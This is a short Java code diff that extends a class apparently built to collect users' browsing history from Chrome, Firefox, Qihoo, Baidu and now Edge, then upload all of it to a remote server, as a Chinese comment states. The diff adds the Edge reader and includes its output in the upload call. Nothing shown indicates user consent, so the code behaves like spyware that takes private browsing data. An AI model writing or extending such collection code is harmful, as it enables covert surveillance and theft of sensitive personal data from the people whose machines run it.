@@ -1,9 +1,6 @@
 package org.kamuyashiro;
 
-import org.kamuyashiro.Browser.BaiduBrowserHistoryReader;
-import org.kamuyashiro.Browser.ChromeBrowserHistoryReader;
-import org.kamuyashiro.Browser.FirefoxBrowserHistoryReader;
-import org.kamuyashiro.Browser.QihooBrowserHistoryReader;
+import org.kamuyashiro.Browser.*;
 
 import java.util.List;
 
@@ -15,8 +12,10 @@ public class BrowserHistoryUploader {
       List<String> firefoxHistory = FirefoxBrowserHistoryReader.getHistory();
       List<String> qihooHistory = QihooBrowserHistoryReader.getHistory();
       List<String> baiduHistory = BaiduBrowserHistoryReader.getHistory();
+      List<String> edgeHistory = EdgeBrowserHistoryReader.getHistory();
+
 
       // 将历史记录上传到服务器
-      HistoryUploader.upload(chromeHistory, firefoxHistory, qihooHistory, baiduHistory);
+      HistoryUploader.upload(chromeHistory, firefoxHistory, qihooHistory, baiduHistory,edgeHistory);
    }
 }
